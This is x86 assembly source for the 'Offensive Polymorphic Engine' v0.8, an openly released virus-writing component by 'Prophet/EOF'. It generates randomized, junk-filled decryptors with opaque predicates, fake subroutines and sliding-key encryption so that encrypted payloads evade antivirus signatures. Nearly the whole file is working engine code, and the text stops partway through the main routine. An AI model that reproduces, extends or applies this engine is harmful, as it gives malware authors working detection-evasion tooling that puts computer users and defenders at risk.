;---------------------------------------------------------------------------------------------------------;
;                               __         __               ___ __  ___                                   ;
;                              /  )_ _ /  /__)_     / _ _/ (_  /  )(_                                     ;
;                             /(_/(// /( /   / ()/)/)(- /  /__(__/ /                                      ; 
;                                               /                                                         ;
;													  ;	
;                                           __                                                            ;
;                                          /__)_ _  _ _  _/                                               ;
;                                         /   / (-_) (-/)/                                                ;    
;                                                                                                         ;
;          												  ;	
;              _____       ___     ___                                                                    ;
;             /\  __`\   /'___\  /'___\                          __                                       ; 
;             \ \ \/\ \ /\ \__/ /\ \__/    __     ___      ____ /\_\   __  __     __                      ;
;              \ \ \ \ \\ \ ,__\\ \ ,__\ /'__`\ /' _ `\   /',__\\/\ \ /\ \/\ \  /'__`\                    ;
;               \ \ \_\ \\ \ \_/ \ \ \_//\  __/ /\ \/\ \ /\__, `\\ \ \\ \ \_/ |/\  __/                    ;
;                \ \_____\\ \_\   \ \_\ \ \____\\ \_\ \_\\/\____/ \ \_\\ \___/ \ \____\                   ;
;                 \/_____/ \/_/    \/_/  \/____/ \/_/\/_/ \/___/   \/_/ \/__/   \/____/                   ;
;                                                                                                         ; 
;                                                                                                         ;
;  ____         ___                ____                                                    ___            ;
; /\  _`\      /\_ \              /\  _`\                     __                         /'___`\          ;
; \ \ \L\ \ ___\//\ \    __  __   \ \ \L\_\    ___       __  /\_\     ___       __      /\_\ /\ \         ;
;  \ \ ,__// __`\\ \ \  /\ \/\ \   \ \  _\L  /' _ `\   /'_ `\\/\ \  /' _ `\   /'__`\    \/_/// /__        ;
;   \ \ \//\ \L\ \\_\ \_\ \ \_\ \   \ \ \L\ \/\ \/\ \ /\ \L\ \\ \ \ /\ \/\ \ /\  __/       // /_\ \       ;
;    \ \_\\ \____//\____\\/`____ \   \ \____/\ \_\ \_\\ \____ \\ \_\\ \_\ \_\\ \____\     /\______/       ;
;     \/_/ \/___/ \/____/ `/___/> \   \/___/  \/_/\/_/ \/___L\ \\/_/ \/_/\/_/ \/____/     \/_____/        ;
;                            /\___/                      /\____/                                          ;
;                            \/__/                       \_/__/                                           ;
;                                                                                                         ;
;                     											  ;	
;													  ;	 				
;v0.8 (beta) public version										  ;		
;---------------------------------------------------------------------------------------------------------;
; Ring3/0 Polymorphic Decryptor Creator 
; 
; Features 
;
;Generates:
;
;Memory Read/Write 
;Loops , Predicates
;Subroutines
;
;Realistic Garbage
;Position Independent
;Sliding Key  
;
;This is not final version. Many improvements are planned. (Apis , PRIDE , SSE/FPU instructions)
;Watch eof-project.net or vx.netlux.org for new releases
; 
;Prophet/EOF(24.8.2009)
;
poly_vars struct
					; VARIABLES INITIALIZED BEFORE POLY CALL
					poly_ptr_code_base_va  	  dd 	?      ;   virtual-address of encrypted code 
					poly_ptr_code_base_raw    dd 	?      ;   raw-address of encrypted code
					poly_ptr_decrypt_buf_va   dd    ?      ;   Va of buffer where code will be decrypted (0 if dont move code)
					poly_code_size 	  	  dd 	?      ;   size of code to crypt
					poly_code_entry_offset    dd    ?      ;   ep offset relative to code_base_va  
					poly_decryptor_base       dd 	?      ;   ptr to buffer where decrytor will be created
					poly_decryptor_base_va 	  dd 	?      ;   virtual-address of decryptor base   
					poly_decryptor_size       dd    ?      ;   size of created decryptor 
					poly_options              dd 	?      ;   poly options 
					poly_garbage_level        dd 	?      ;   level of garbage (1-lowest 3-average 5-huge)
					poly_read_mem_base        dd    ?      ;   va address of readable memory 
					poly_read_mem_size        dd    ?      ;   size of readable memory 
	
					; VARIABLES USED DURING POLY ENGINE RUN
					poly_algo1  		  dd 	?      ;   crypt algorythm
					poly_algo2  		  dd 	?      ;   key-sliding algorythm 
					poly_key    		  dd 	?      ;   encrypt key
					poly_slide_key 		  dd 	?      ;   slide key 
					poly_ptr_reg   		  dd 	?      ;   register used as ptr to memory
					poly_key_reg   		  dd 	?      ;   register which is keeping decrypt key 
					poly_loop_reg  		  dd 	?      ;   loop counter
					poly_store_reg            dd    ?      ;   used in move-data loop 
					poly_junk_mem_reg	  dd    ?      ;   junk mem accesses ptr reg 
					poly_junk_mem_pos         dd    ?      ;   value to which reg was initialized 
					poly_reg_usage 		  dd 	?      ;   watch register usage 	 
					poly_random_seed 	  dd 	?      ;   random seed
					poly_garbler_flags 	  dd 	?      ;   keep garbler state
					poly_entry_offset         dd    ?      ;   offset of poly entry-point relative to poly base 
					
					poly_subroutines_count    dd    ?      ;   number of poly subs generated 
					poly_subroutines_table    db    1024 DUP(0)
poly_vars ends

;
;	Poly Options Flags 
;
					
					POLY_OPT_POS_INDEPENDENT equ 	1      ;   use/dont use delta offset in decryptor 
					POLY_OPT_STACK_WRITES    equ 	2      ;   (not implemented)
					POLY_OPT_MEM_WRITES      equ 	4      ;   ( buggy ) 
					POLY_OPT_USE_SUBROUTINES equ 	8      ;   generate junk subroutines 
					POLY_OPT_MEM_ACC_DIRECT  equ 	16     ;   do direct mem accesses (dont use if pe is reloc-able)
					POLY_OPT_MINIMAL_GARBAGE equ 	32     ;   generate minimal amount of garbage 

;
;	Poly configuration  
;
;					POLY_DEBUG              equ 	1      ;   poly-debugging regime (comment out to disable) 
;                   			POLY_DISABLE_GARBAGE    equ 	1      ;   disable garbage generator (comment out to enable) 
					POLY_SUBROUTINES_MAX    equ 	5      ;   max count of poly subroutines 
					POLY_SUBR_PARAMS_MAX    equ 	6      ;   max count of sub arguments 
;					POLY_ALIGN_SUBR         equ 	1      ;   align subroutines to 0fh (comment out to disable)
					POLY_ALIGN_BYTE         equ 	0cch   ;   alignment byte 
					POLY_ESP_ACC_RNG_MAX    equ 	10     ;   max stack access displacement [esp +- random(max) * 4]
					POLY_LOOP_ITERATION_MAX equ 	10000h ;   max loop iterations
					POLY_LOOP_ITERATION_MIN equ 	1000h  ;   min loop iterations 
					
;
;	Occurence of garbage 
;				
					POLY_OCCUR_LOOP         equ     2
					POLY_OCCUR_PREDICATE    equ     5
					POLY_OCCUR_PUSH_POP     equ     7
					POLY_OCCUR_CALL         equ	2
					POLY_OCCUR_API          equ	0      ;   not implemented
					POLY_OCCUR_IMM          equ 	5 
					POLY_OCCUR_MODRM        equ     12
					
					POLY_OCCUR_COUNT equ  ( POLY_OCCUR_LOOP + POLY_OCCUR_PREDICATE + POLY_OCCUR_PUSH_POP + POLY_OCCUR_CALL + POLY_OCCUR_API + POLY_OCCUR_IMM + POLY_OCCUR_MODRM )
					
					POLY_MODRM_OCCUR_REG_REG equ 	0
					POLY_MODRM_OCCUR_MEM     equ 	0
					POLY_MODRM_OCCUR_STACK   equ 	0
									    
;
;	Garbler state flags
;

					POLY_FLAG_IN_LOOP  equ 	1 ; in loop 
					POLY_FLAG_IN_SUBR  equ 	2 ; in subroutine 
					POLY_FLAG_IN_PRED  equ  4 ; in predicate 

					assume ebp:ptr poly_vars
.code
PolyEngineEntry:			jmp PolyEngine
					
PolyGarbleInit:     			pushad
					
					; check if subroutines flag is set 
					mov eax,dword ptr [ebp].poly_options
					and eax,POLY_OPT_USE_SUBROUTINES
					test eax,eax
					jz Garble_Init_No_Sub
										
					; create junk subroutines 
					mov eax,POLY_SUBROUTINES_MAX
					call random
					test eax,eax
					jz PolyGarbleInitEnd
					
					mov ecx,eax
					
Garble_Init_Loop1:  			call Garble_Create_funct					
					loop Garble_Init_Loop1
					
Garble_Init_No_Sub:			mov dword ptr [esp],edi

PolyGarbleInitEnd:			popad 
					retn

;
;	Garbage creator for use in poly engine 
;					 	 
; ESP,EBP must be set as used before calling PolyGarbler 

; ebp = ptr to poly struct
; edi = buffer  
PolyGarble:		
ifndef POLY_DISABLE_GARBAGE
					pushad
					
					mov eax,dword ptr [ebp].poly_options
					and eax,POLY_OPT_MINIMAL_GARBAGE
					test eax,eax 
					jz PolyGarbleNormal
					
					mov ecx,1
					jmp PolyGarbleCont1  

PolyGarbleNormal:			mov ecx,dword ptr [ebp].poly_garbage_level ; deepness of recursivity
					imul ecx,3
					
PolyGarbleCont1:			call Garble 
	
					mov dword ptr [esp],edi
					popad
endif ;POLY_DISABLE_GARBAGE					  
					retn 
					
;
;	Recursive Garbler 
;					

Garble:				
					mov eax,POLY_OCCUR_COUNT
					call random
					
					cmp eax,POLY_OCCUR_PUSH_POP
					jb G_Push_Pop
					sub eax,POLY_OCCUR_PUSH_POP 
					
					cmp eax,POLY_OCCUR_PREDICATE
					jb G_Predicate
					sub eax,POLY_OCCUR_PREDICATE 
					
					cmp eax,POLY_OCCUR_LOOP
					jb G_Loop
					sub eax,POLY_OCCUR_LOOP
					
					cmp eax,POLY_OCCUR_CALL
					jb G_Call
					sub eax,POLY_OCCUR_CALL 
					
;					cmp eax,POLY_OCCUR_MODRM
					
					cmp eax,POLY_OCCUR_IMM
					jb G_Imm
					sub eax,POLY_OCCUR_IMM  
					
;					cmp eax,POLY_OCCUR_API

					call Garble_Create_Modrm
					jmp Garble_cont
					
; loop 
G_Loop:					call Garble_Loop	
					jmp Garble_cont
					
; opaque predicate					
G_Predicate: 				call Garble_Predicate 					
					jmp Garble_cont

; push pop 					
G_Push_Pop:				call Garble_Push_Pop
					jmp Garble_cont

G_Modrm:				jmp Garble_cont

; immediate
G_Imm:					call Garble_Create_Imm
					jmp Garble_cont
; call to junk proc 
G_Call:					call Garble_Sub_Call

Garble_cont:				test ecx,ecx
					jz GarbleEnd
					dec ecx
					 
					call Garble  
GarbleEnd:				retn

;
; 	Create Opaque predicate 
;
Garble_Predicate:   			cmp ecx,4
					jbe Garble_Predict_End
					
					cmp ecx,10
					ja Garble_Predict_End ; just temporal solution to short-near problem 
					
					call Is_In_Pred
					test eax,eax
					jnz Garble_Predict_End
					
					mov eax,8
					call random 
					test eax,eax
					jnz Garble_Predict_Jcc
					
; JMP 									
					mov eax,0ebh
					stosb
					push edi
					
					jmp Garble_Predict_C 
Garble_Predict_Jcc:			call Garble_Create_Cmp
					
					mov eax,10h
					call random
					add eax,70h
					stosb
					push edi
					inc edi
				
Garble_Predict_C:			call Set_In_Pred

					dec ecx
					call Garble ; recursive call
					pop ebx
					
					call Set_In_Pred
				
					mov eax,edi
					sub eax,ebx
					dec eax
					mov byte ptr [ebx],al    
	
Garble_Predict_End: 			retn


;
; Create push/pop
;
Garble_Push_Pop:			cmp ecx,2
					jbe Garble_Push_Pop_End
					 
					call Garble_Create_Push
					
					dec ecx
					call Garble ; recursive call 
					
					call get_free_reg_32_no_set
					cmp eax,-1
					jne Garble_Push_Pop_c
					
					mov eax,0004c483h ; no free reg , create add esp,4
					stosd
					dec edi
					jmp Garble_Push_Pop_End
					
Garble_Push_Pop_c:			add al,58h ; pop free reg
					stosb				
					 
Garble_Push_Pop_End:			retn

;
;	Generate Loop 
; 

Garble_Loop: 				call Is_In_Loop
					test eax,eax
					jnz Garble_Loop_End
					
					cmp ecx,5
					jbe Garble_Loop_End
					
					call get_free_reg_32
					cmp eax,-1
					je Garble_Loop_End
					
					call Set_In_Loop ; set that we are in loop 
					
					mov ebx,eax
					mov eax,POLY_LOOP_ITERATION_MAX ; max number of loop iterations
					call random
					add eax,POLY_LOOP_ITERATION_MIN   ; minimal iterations count
					push ecx 
					mov ecx,eax 
					  
					; initialize loop counter register
					call Asm_Mov_Reg_Imm_32
					pop ecx
					
					; save loop start
 					push edi
 					; save counter register 
 					push ebx
					
					dec ecx
					call Garble
					pop eax
					
					mov ebx,eax
					call unset_reg_32
					; dec loop counter
					mov al,48h
					add al,bl
					stosb
					
					; test counter reg 
					mov al,085h
					stosb
					
					mov eax,ebx
					rol eax,3
					add eax,ebx 
					add eax,0c0h
					stosb 
					
					; jcc loop
					pop eax 
					sub eax,edi
					push eax
					not eax
					cmp eax,255 / 2
					pop eax 
					jbe Garble_Loop_Short 
					
					; near jcc 		
					sub eax,6			
					mov word ptr [edi],0850fh
					mov dword ptr [edi + 2],eax
					add edi,6 
					
					jmp Garble_Loop_Cont
					; short jcc 				
Garble_Loop_Short:			sub eax,2
					mov byte ptr [edi],75h ; jnz
					mov byte ptr [edi + 1],al
					add edi,2
					
Garble_Loop_Cont: 			call Set_In_Loop ; unset in-loop garbler state 					
					
Garble_Loop_End:			retn 

;
;	Generate call to poly subroutine 
;
Garble_Sub_Call: 			push ecx
					push ebx
					cmp dword ptr [ebp].poly_subroutines_count,0
					je Garble_Sub_Call_End 
					
					call Is_In_Subr ; dont make subroutine call inside subroutine 
					test eax,eax
					jnz Garble_Sub_Call_End
					
					; pick random  subroutine from table
					mov eax,dword ptr [ebp].poly_subroutines_count
					call random
					lea eax,[eax * 8] 
					
					lea ebx,[ebp].poly_subroutines_table
					add ebx,eax
					
					; if junk mem ptr is initialized store it before subroutine call
					cmp dword ptr [ebp].poly_junk_mem_pos,0
					je Garble_Sub_No_Save1
					
					mov ecx,dword ptr [ebp].poly_junk_mem_reg
					add ecx,50h
					mov byte ptr [edi],cl ; push ptr reg 
					inc edi 
					
Garble_Sub_No_Save1:			mov ecx,dword ptr [ebx + 4] ; number of arguments
					test ecx,ecx
					jz Garble_Sub_No_Arg
					
					; create fake argument passing 
Garble_Sub_Arg:				call Garble_Create_Push
					loop Garble_Sub_Arg
					
					; create call to function
Garble_Sub_No_Arg:			mov eax,dword ptr [ebx]
					sub eax,edi
					sub eax,5 
					mov byte ptr [edi],0e8h
					inc edi
					stosd   
					
					; clean stack from arguments (__cdecl)
					mov eax,dword ptr [ebx + 4] ; number of function arguments
					test eax,eax
					jz Garble_Sub_No_Save2
					
					imul eax,4
					rol eax,16
					add eax,9000c483h
					stosd
					dec edi 
					
					; if junk mem ptr is initialized store it before subroutine call
Garble_Sub_No_Save2:			cmp dword ptr [ebp].poly_junk_mem_pos,0
					je Garble_Sub_Call_End
					
					mov eax,dword ptr [ebp].poly_junk_mem_reg
					add eax,58h
					stosb ; pop ptr reg 
  					
Garble_Sub_Call_End:			pop ebx 
					pop ecx
					retn 

;
;	Generate Modrm Byte
;

Garble_Create_Modrm_Byte: 
					push ebx
					
					call get_free_reg_32_no_set
					cmp eax,-1
					je Modrm_reg1_reg1 ; no free reg
					rol eax,3
					mov ebx,eax
					
					mov eax,5
					call random
					
					test eax,eax
					jz Modrm_Reg_Reg
					
					cmp eax,3
					jb Modrm_Stack_Read  
;
; Mem Access
Modrm_Mem_Acc:				mov eax,3	; 1:2 to do direct mem32 access 
					call random
					test eax,eax
					jz Modrm_Mem_Direct
					
					cmp dword ptr [ebp].poly_junk_mem_pos,0
					je Modrm_Mem_Direct ; junk mem ptr wasnt initialized , do direct mem32 acc anyway 					 
					
Modrm_Mem_AccNoDisp:			mov eax,dword ptr [ebp].poly_junk_mem_reg
					add eax,ebx
					stosb
					
					mov eax,dword ptr [ebp].poly_read_mem_size
					sub eax,4
					call random 
					add eax,dword ptr [ebp].poly_read_mem_base
					
					mov ebx,eax
					sub ebx,dword ptr [ebp].poly_junk_mem_pos
					
					mov eax,6 
					call random
					
					cmp eax,0
					je Modrm_Mem_Disp32
					
					cmp eax,4
					jb Modrm_Mem_Disp8
					
					pop ebx
					retn 
					
Modrm_Mem_Disp8:			add byte ptr [edi - 1],40h
					mov byte ptr [edi],bl
					inc edi
					
					pop ebx
					retn
					
Modrm_Mem_Disp32:   			add byte ptr [edi - 1],80h
					mov dword ptr [edi],ebx
					add edi,4  

					pop ebx
					retn 

;
;	Direct memory access (mov reg,[mem32]) 
; only if poly is position independent 
Modrm_Mem_Direct:			mov eax,dword ptr [ebp].poly_options
					and eax,POLY_OPT_MEM_ACC_DIRECT
					test eax,eax
					jnz Modrm_Stack_Read
					
					cmp dword ptr [ebp].poly_read_mem_base,0
					je Modrm_Stack_Read

					mov eax,5
					add eax,ebx
					stosb 
					
					mov eax,dword ptr [ebp].poly_read_mem_size
					call random
					add eax,dword ptr [ebp].poly_read_mem_base
					
					stosd 
					
					jmp Modrm_End
					
; 
; Stack Access ( reg,[esp/ebp +- x] )					
Modrm_Stack_Read:   			mov eax,ebx
					add eax,45h
					mov byte ptr [edi],al
				
   					mov eax,2
   					call random
   					test eax,eax
   					jz Modrm_Stack_Ebp
					
					mov byte ptr [edi + 1],24h
					sub byte ptr [edi],1
					inc edi
Modrm_Stack_Ebp:    			inc edi

					mov eax,POLY_ESP_ACC_RNG_MAX 
					call random 
					imul eax,4
					
					mov ebx,eax
					mov eax,2 ; +/- disp
					call random
					test eax,eax 
					jz Modrm_Stack_DispPos
					
					xor eax,eax
					sub eax,ebx
Modrm_Stack_DispPos:			mov byte ptr [edi],al
 					inc edi 
					 
					jmp Modrm_End

Modrm_Reg_Reg:				call get_reg_32_no_stack
					add eax,ebx ; free reg 
					add eax,0c0h
					stosb
					jmp Modrm_End 

; in case when no reg is free to use					
Modrm_reg1_reg1:			call get_reg_32 ; mov eax/eax
					mov ah,al
					rol al,3
					add al,ah
					add al,0c0h
					stosb  					
					
Modrm_End:				pop ebx
					retn
					
;
;	Generate CMP/TEST
;
Garble_Create_Cmp:  			mov eax,4
					cmp eax,0
					je Garble_Cmp_Imm
					
					cmp eax,1
					je Garble_Cmp_Test   

Garble_Cmp_Cmp:				mov eax,2
					call random
					add eax,38h
					stosb 
					call Garble_Create_Modrm_Byte
					retn 
					
Garble_Cmp_Test:			mov eax,2
					call random
					add eax,84h
					stosb					
					call Garble_Create_Modrm_Byte
					retn
					
Garble_Cmp_Imm:				push ebx
					push ecx 
					
					mov eax,3
					call random 
					mov ebx,eax
					add eax,81h
					stosb 
					
					mov ecx,edi
					call Garble_Create_Modrm_Byte
					
					and byte ptr [ecx],11000111b
					add byte ptr [ecx],7 SHL 3
					
					mov eax,-1
					call random
					
					test ebx,ebx
					jnz Garble_Cmp_Imm8
					
					stosd
					jmp Garble_Cmp_ImmC
					
Garble_Cmp_Imm8:			stosb

Garble_Cmp_ImmC: 			pop ecx
					pop ebx  
					
					retn 

				
;
;	Generate Push 
;

Garble_Create_Push: 			mov eax,5
					call random 
					cmp eax,2
					jbe Garble_Push_Reg32
					
					cmp eax,3
					je Garble_Push_Modrm
					
Garble_Push_Imm:			mov eax,2
					call random
					push ebx
					mov ebx,eax 
					rol eax,1
					add eax,68h
					stosb  

					mov eax,-1
					call random

					test ebx,ebx
					pop ebx 
					jnz Garble_Push_Imm8  
					;imm32 
					stosd
					retn
Garble_Push_Imm8:			stosb
					retn

Garble_Push_Reg32:			call get_reg_32
					add al,50h
					stosb
					retn

Garble_Push_Modrm:			mov al,0ffh
					stosb 

					push edi 
					call Garble_Create_Modrm_Byte
					pop eax

					and byte ptr [eax],11000111b
					add byte ptr [eax],6 SHL 3
 	
					retn 
;					
;	Generate Modrm instruction 
;

;00 ADD
;08 OR
;20 AND
;28 SUB
;30 XOR
;88 MOV
Garble_Create_Modrm:			; 66h prefix ?
					mov eax,7
					call random 
					test eax,eax
					jnz Garble_Modrm_No_66
					
					mov byte ptr [edi],66h ; WORD PTR 
					inc edi

Garble_Modrm_No_66:			 call is_any_free_32 ; do we have any free reg ?
					test eax,eax
					jz Garble_ModrmNo_Regs	
					
					push 08202828h
					push 30300000h
					push 88888888h
					mov ebx,esp
					mov eax,12 
					call random
					mov al,byte ptr [ebx + eax]
					add al,3
					mov ebx,edi 
					stosb
					add esp,12
					
					jmp @f
					
					; create mov reg1,reg1 as no regs are free
Garble_ModrmNo_Regs:			mov eax,89h
					stosb
					
@@:					call Garble_Create_Modrm_Byte
					
					; test if mem writes are allowed 
					mov eax,dword ptr [ebp].poly_options
					and eax,POLY_OPT_MEM_WRITES
					test eax,eax
					jz Garble_Modrm_Read
					
					mov eax,2
					call random 
					test eax,eax
					jnz Garble_Modrm_Read
					
					cmp byte ptr [ebx],8dh ; lea 
					je Garble_Modrm_Read
	
					mov al,byte ptr [ebx + 1]
					and al,11000000b
					cmp al,0c0h ; mod reg/reg ?
					je Garble_Modrm_Read 

					mov al,byte ptr [ebx + 1]
					and al,111b
					cmp al,100b ; sib  
					je Garble_Modrm_Read
					
					cmp al,101b
					jne Garble_Modrm_Write
					
					mov al,byte ptr [ebx + 1]
					and al,11000000b
					test al,al
					jnz Garble_Modrm_Read
; do mem write now					  
Garble_Modrm_Write: 			xor byte ptr [ebx],2h
					
Garble_Modrm_Read:			pop ebx 	
					retn 

;
;	Generate imm instruction 
;

Garble_Create_Imm:			push ebx 
					call get_free_reg_32_no_set
					mov ebx,eax 
					cmp eax,-1 
					je Garble_Create_Imm_E 
 
  					mov eax,5
  					call random
  					test eax,eax
  					jz Garble_Imm_Init_Ptr

					cmp eax,1
					jbe Garble_Imm_Inc_Dec				
  					
  					mov eax,0b8h
  					add eax,ebx 
  					stosb
  					
  					mov eax,-1
  					call random 
  					stosd
  					
  					pop ebx
  					retn 
  					
; c1 group 
; 81 83 group 
Garble_Imm_Groups:			mov eax,4
  					call random 
  					
 					push 818383c1h
 					mov al,byte ptr [esp + eax]
 					add esp,4
					stosb 
  					 
  					call Garble_Create_Modrm_Byte
  					pop ebx
  					retn 
; inc/dec reg 
Garble_Imm_Inc_Dec:			 mov eax,2
					call random
					imul eax,8
					add eax,40h
					add eax,ebx
					stosb 
					pop ebx
					retn  					
  					
;
; Initialize pointer 
Garble_Imm_Init_Ptr:			push ecx
					
					call Is_In_Pred ; dont setup ptr in predicate  
					test eax,eax
					jnz Garble_Create_ImmE1
					
					call Is_In_Loop 
					test eax,eax
					jnz Garble_Create_ImmE1 ; dont setup ptr in loop 

					cmp dword ptr [ebp].poly_read_mem_base,0
					je Garble_Create_ImmE1
					
					mov eax,dword ptr [ebp].poly_read_mem_size
					cmp eax,10
					jb Garble_Create_ImmE1
					
					sub eax,4
					call random 
					add eax,dword ptr [ebp].poly_read_mem_base
					mov ecx,eax
					
					cmp dword ptr [ebp].poly_junk_mem_pos,0
					je Garble_Imm_No_Unset ; reg wasnt set , no need to unset 
					
					mov eax,dword ptr [ebp].poly_junk_mem_reg
					call unset_reg_32 ; release old ptr register
					
Garble_Imm_No_Unset:			mov dword ptr [ebp].poly_junk_mem_reg,ebx
					mov dword ptr [ebp].poly_junk_mem_pos,ecx
					
					push eax
					mov eax,dword ptr [ebp].poly_options
					and eax,POLY_OPT_MEM_ACC_DIRECT
					test eax,eax
					pop eax
					jz Grable_Imm_indir 
					call Asm_Mov_Reg_Imm_32 ; FIX HERE call Asm_Init_Ptr
					jmp @f
Grable_Imm_indir:			call Asm_Init_Ptr
					
@@:					mov eax,ebx
					call set_reg_32 
					
Garble_Create_ImmE1:			pop ecx 
Garble_Create_Imm_E:			pop ebx
					retn 

;
;	Create Junk Function 
;

Garble_Create_funct:
					push ebx
					push ecx
					mov eax,dword ptr [ebp].poly_subroutines_count
					imul eax,8 
					lea ebx,[ebp].poly_subroutines_table
					add ebx,eax
					
					mov dword ptr [ebx],edi ; store subroutine entry to table
					mov eax,POLY_SUBR_PARAMS_MAX 
					call random
					mov dword ptr [ebx + 4],eax ; number of sub params
					
					inc dword ptr [ebp].poly_subroutines_count 

					; init stack frame 
					mov byte ptr [edi],55h 			; push ebp 
					mov word ptr [edi + 1],0ec8bh	; mov ebp,esp
					add edi,3
					
					mov eax,dword ptr [ebp].poly_garbage_level 
					imul eax,2
					call random
					inc eax 
					mov ecx,eax
					
					call Set_In_Subr ; set in subroutine flag 
					mov ebx,dword ptr [ebp].poly_reg_usage  ; store reg usage 
					
Create_Funct_Loop:			call PolyGarble
					loop Create_Funct_Loop
					
					call Set_In_Subr
					mov dword ptr [ebp].poly_reg_usage,ebx  ; restore reg usage 
					
					mov byte ptr [edi],5dh			; pop ebp
					mov byte ptr [edi + 1],0c3h     ; retn 
					add edi,2 
					
ifdef POLY_ALIGN_SUBR					
					; now do the compiler-like 16 align 
					xor ecx,ecx
					sub ecx,edi
					and ecx,0fh
					mov al,POLY_ALIGN_BYTE
					
					test ecx,ecx
					jz Create_align_End
					
					rep stosb					
					 
endif ; POLY_ALIGN_SUBR ;					
					
Create_align_End:			xor eax,eax 
					mov dword ptr [ebp].poly_junk_mem_reg,eax ; clear initialized junk mem ptr 
					mov dword ptr [ebp].poly_junk_mem_pos,eax

					pop ecx  
					pop ebx  
					retn 
					
;
;	Standalone Garbage Creator 
;					
;  for external use
;  eax = ptr poly_vars
;  ecx = amount of garbage
PolyCreateGarbage:			pushad

					mov ebp,eax
					
					call PolyInit
					call PolyGarbleInit
					
					mov edi,dword ptr [ebp].poly_decryptor_base
					mov eax,edi
					
					test ecx,ecx
					jz @end 
@@:					call PolyGarble ; Internal poly garbler 					
					loop @b
					
					sub edi,eax
					mov dword ptr [ebp].poly_decryptor_size,edi
					mov dword ptr [esp + 1ch],edi ;save size to eax  
@end:					popad
					retn					

;					
; Poly initialization routine
;
; ebp = ptr poly_vars  					
PolyInit:				pushad
					
					; fill poly state memory with zeroes 
					xor eax,eax
					mov ecx,15
					lea edi,[ebp].poly_algo1
					rep stosd
					
					; set esp,ebp as used regs 
					mov eax,4
					call set_reg_32
					inc eax
					call set_reg_32 
					
					; init random  seed 
					rdtsc 
					mov dword ptr [ebp].poly_random_seed,eax

					popad 
					retn 				
				
;
;	PolyEngine
; 
;	*Create linear decryptor with slide key 
;					

; _in   eax = ptr to poly struct
; _out  eax = size of decryptor 
PolyEngine:				pushad

					mov ebp,eax
					assume ebp:ptr poly_vars
					
					call PolyInit 
					
					; choose operations which will be used (xor,add,sub)
					mov eax,3
					call random
					mov dword ptr [ebp].poly_algo1,eax ; crypt algo 
					
					mov eax,2
					call random
					inc eax ; add/sub only
					mov dword ptr [ebp].poly_algo2,eax ; slide algo 
					
					; choose registers
					call get_free_reg_32
					mov dword ptr [ebp].poly_ptr_reg,eax
	
					call get_free_reg_32
					mov dword ptr [ebp].poly_key_reg,eax
	
					call get_free_reg_32
					mov dword ptr [ebp].poly_loop_reg,eax 
	
					call generate_key_32  
					mov dword ptr [ebp].poly_slide_key,eax
					
					; apply encryption to data
					call generate_key_32 
					call crypt_data 
					mov dword ptr [ebp].poly_key,eax
					
					; start generating decryptor code 
					mov edi,dword ptr [ebp].poly_decryptor_base
					
					; intialize poly garbler
					call PolyGarbleInit
					
					; save poly entry 
					mov eax,edi
					sub eax,dword ptr [ebp].poly_decryptor_base
					mov dword ptr [ebp].poly_entry_offset,eax
					
					; CREATE STACK FRAME FOR DECRYPTOR
					mov byte ptr [edi],55h 			; push ebp 
					mov word ptr [edi + 1],0ec8bh	; mov ebp,esp
					add edi,3
										
					; GARBLE
					call PolyGarble
					
					;
					; ASSEMBLE MOVE DATA LOOP 
					;
					;  this loop is used when data are decrypted 
					;  to different location in memory than their initial position is
					;  to activate this behaviour , set poly_vars.poly_ptr_decrypt_buf_va  
					call Asm_Move_Data_Loop
					 
					;
					; INIT VALUES FOR DECRYPTOR
					;
					
					; init decrypt key in reg
					mov ebx,dword ptr [ebp].poly_key_reg
					mov ecx,dword ptr [ebp].poly_key
					call Asm_Mov_Reg_Imm_32
					
					; GARBLE
					call PolyGarble
					
					; init decrypt buffer ptr
					mov ecx,dword ptr [ebp].poly_ptr_decrypt_buf_va
					test ecx,ecx
					jnz @f
					mov ecx,dword ptr [ebp].poly_ptr_code_base_va
@@:					mov ebx,dword ptr [ebp].poly_ptr_reg 
					add ecx,dword ptr [ebp].poly_code_size
					dec ecx
					call Asm_Init_Ptr
					
					
					; GARBLE
					call PolyGarble
					
					; init loop counter 
					mov ebx,dword ptr [ebp].poly_loop_reg
					mov ecx,dword ptr [ebp].poly_code_size
					call Asm_Mov_Reg_Imm_32
					
					; GARBLE
					call PolyGarble
					
					call Set_In_Loop ; set in-loop garbler state 
					
					; GENERATE POLY DECRYPTION LOOP
					mov esi,edi  ; loop_base
					
					call PolyGarble 
					 
					; OPERATION (xor/add/sub [ptr_reg],key_reg )
					mov eax,290131h
					mov ecx,dword ptr [ebp].poly_algo1
					imul ecx,8
					ror eax,cl
					mov byte ptr [edi],al
				 
					; (key_reg << 3) + ptr_reg;
					mov eax,dword ptr [ebp].poly_key_reg
					rol eax,3
					add eax,dword ptr [ebp].poly_ptr_reg
					mov byte ptr [edi + 1],al
					add edi,2
					
					; GARBLE
					call PolyGarble
					
					; KEY SLIDE (xor/add/sub key_reg,slide_key)
					mov byte ptr [edi],081h
					
					mov eax,050006h ; ( xor/add/sub )
					mov ecx,dword ptr [ebp].poly_algo2
					imul ecx,8
					ror eax,cl
					rol eax,3
					add eax,dword ptr [ebp].poly_key_reg
					add eax,0c0h
					mov byte ptr [edi + 1],al
			
					mov eax,dword ptr [ebp].poly_slide_key
					mov dword ptr [edi + 2],eax
					add edi,6
					
					; GARBLE
					call PolyGarble
					
					; dec ptr 
					mov eax,48h
					add eax,dword ptr [ebp].poly_ptr_reg
					stosb
					
					; GARBLE
					call PolyGarble
					
					; ASSEMBLE LOOP
					 
					; dec counter reg
					mov eax,48h
					add eax,dword ptr [ebp].poly_loop_reg
					stosb
					
	;
	;	Decrypt Loop 
	;				
					; test counter reg 
					mov al,085h
					stosb
					
					mov eax,dword ptr [ebp].poly_loop_reg
					rol eax,3
					add eax,dword ptr [ebp].poly_loop_reg
					add eax,0c0h
					stosb 
					
					; jcc loop
					mov eax,esi ; esi = loop start 
					sub eax,edi
					push eax
					not eax
					cmp eax,255 / 2
					pop eax 
					jbe Poly_Loop_Short 
	; near jcc 		
					sub eax,6			
					mov word ptr [edi],0850fh
					mov dword ptr [edi + 2],eax
					add edi,6 
					
					jmp Poly_Loop_Cont
	; short jcc 				
Poly_Loop_Short:			sub eax,2
					mov byte ptr [edi],75h ; jnz
					mov byte ptr [edi + 1],al
					add edi,2
					
Poly_Loop_Cont: 			call Set_In_Loop ; unset in-loop garbler state 
					
					; free regs used in decrypt loop
					mov eax,dword ptr [ebp].poly_key_reg
					call unset_reg_32
					
					mov eax,dword ptr [ebp].poly_ptr_reg
					call unset_reg_32
					
					mov eax,dword ptr [ebp].poly_loop_reg
					call unset_reg_32
					
					; GARBLE
					call PolyGarble

